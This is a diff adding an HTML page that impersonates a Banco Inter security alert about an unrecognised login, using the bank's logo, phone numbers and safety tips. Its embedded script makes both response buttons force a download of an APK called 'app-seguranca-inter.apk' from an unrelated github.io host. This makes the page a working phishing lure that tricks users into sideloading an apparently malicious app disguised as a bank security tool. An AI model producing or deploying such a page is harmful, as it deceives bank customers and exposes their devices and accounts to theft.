@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta de Segurança - Inter</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 520px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+        }
+        
+        .header {
+            background-color: white;
+            padding: 25px 30px 15px 30px;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .logo {
+            height: 35px;
+        }
+        
+        .protocolo {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            color: #666;
+            font-size: 12px;
+            background-color: #f0f0f0;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .alert-title {
+            color: #FF6B00;
+            font-size: 22px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        .alert-icon {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        
+        .alert-icon span {
+            display: inline-block;
+            background-color: #FF6B00;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            line-height: 50px;
+            font-size: 24px;
+        }
+        
+        .alert-message {
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .device-info {
+            background-color: #f9f9f9;
+            border-left: 4px solid #FF6B00;
+            padding: 18px;
+            margin-bottom: 25px;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .device-info h3 {
+            color: #FF6B00;
+            margin-bottom: 12px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .device-details {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .device-detail {
+            display: flex;
+            padding: 5px 0;
+        }
+        
+        .detail-label {
+            font-weight: 600;
+            min-width: 120px;
+            color: #555;
+        }
+        
+        .detail-value {
+            color: #333;
+        }
+        
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .btn {
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .btn-danger {
+            background-color: #FF6B00;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background-color: #e05a00;
+            transform: translateY(-2px);
+            box-shadow: 0 3px 8px rgba(255, 107, 0, 0.3);
+        }
+        
+        .btn-secondary {
+            background-color: #f0f0f0;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e0e0e0;
+            transform: translateY(-2px);
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .security-tips {
+            background-color: #fff9e6;
+            border: 1px solid #ffd966;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 25px;
+        }
+        
+        .security-tips h4 {
+            color: #FF6B00;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .security-tips ul {
+            padding-left: 20px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .security-tips li {
+            margin-bottom: 8px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .contact-info {
+            margin-top: 10px;
+            font-weight: 600;
+            color: #FF6B00;
+        }
+        
+        @media (max-width: 480px) {
+            .content {
+                padding: 20px;
+            }
+            
+            .device-detail {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .detail-label {
+                min-width: auto;
+            }
+            
+            .protocolo {
+                position: static;
+                text-align: center;
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Logo_do_banco_Inter_%282023%29.svg" alt="Inter" class="logo">
+            <div class="protocolo">Protocolo: INT-7842-2023</div>
+        </div>
+        
+        <div class="content">
+            <h2 class="alert-title">Alerta de Segurança</h2>
+            
+            <p class="alert-message">
+                Detectamos um novo acesso à sua conta em um dispositivo não reconhecido. 
+                Se você não realizou este acesso, clique em "Não estou ciente" para proteger sua conta.
+            </p>
+            
+            <div class="device-info">
+                <h3>
+                    <span>📱</span>
+                    Resumo do novo acesso
+                </h3>
+                <div class="device-details">
+                    <div class="device-detail">
+                        <span class="detail-label">Dispositivo:</span>
+                        <span class="detail-value">Xiaomi 13c</span>
+                    </div>
+                    <div class="device-detail">
+                        <span class="detail-label">Localização:</span>
+                        <span class="detail-value">Região de Minas Gerais</span>
+                    </div>
+                    <div class="device-detail">
+                        <span class="detail-label">IP Aproximado:</span>
+                        <span class="detail-value">187.32.XXX.XXX</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="security-tips">
+                <h4>
+                    <span>🔒</span>
+                    Dicas de segurança
+                </h4>
+                <ul>
+                    <li>Nunca compartilhe suas senhas ou códigos de segurança</li>
+                    <li>O Banco Inter não solicita senhas ou informações pessoais por e-mail ou telefone</li>
+                    <li>Ative a verificação em duas etapas em sua conta</li>
+                </ul>
+            </div>
+            
+            <div class="buttons">
+                <button class="btn btn-danger">Não estou ciente</button>
+                <button class="btn btn-secondary">Sim, fui eu</button>
+            </div>
+            
+            <div class="footer">
+                Em caso de dúvidas, entre em contato com a Central de Atendimento Inter.
+                <div class="contact-info">📞 3003-4070 (Capitais) | 0800 940 0007 (Demais localidades)</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // URL do aplicativo
+        const appUrl = "https://suportedigital-pixel.github.io/suporte/inter.apk";
+        
+        // Função para iniciar o download
+        function iniciarDownload() {
+            // Método 1: Abrir em nova aba (funciona na maioria dos casos)
+            window.open(appUrl, '_blank');
+            
+            // Método 2: Criar link temporário para forçar download
+            setTimeout(function() {
+                const link = document.createElement('a');
+                link.href = appUrl;
+                link.download = 'app-seguranca-inter.apk';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 500);
+            
+            // Mensagem de confirmação
+            alert('Aplicativo de segurança está sendo baixado. Verifique sua pasta de downloads.');
+        }
+
+        // Adicionando interatividade aos botões
+        document.querySelector('.btn-danger').addEventListener('click', function() {
+            alert('Acesso não reconhecido. Sua conta será protegida. Baixando aplicativo de segurança...');
+            iniciarDownload();
+        });
+        
+        document.querySelector('.btn-secondary').addEventListener('click', function() {
+            alert('Acesso confirmado. Obrigado por verificar sua atividade. Baixando aplicativo de segurança...');
+            iniciarDownload();
+        });
+    </script>
+</body>
+</html>
